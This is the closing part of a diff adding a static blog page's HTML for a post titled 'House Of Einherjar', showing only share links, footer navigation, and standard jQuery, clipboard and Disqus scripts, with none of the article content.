+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/03/02/House-Of-Einherjar/&title=House Of Einherjar"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/03/02/House-Of-Einherjar/&name=House Of Einherjar&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/03/02/House-Of-Einherjar/&t=House Of Einherjar"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
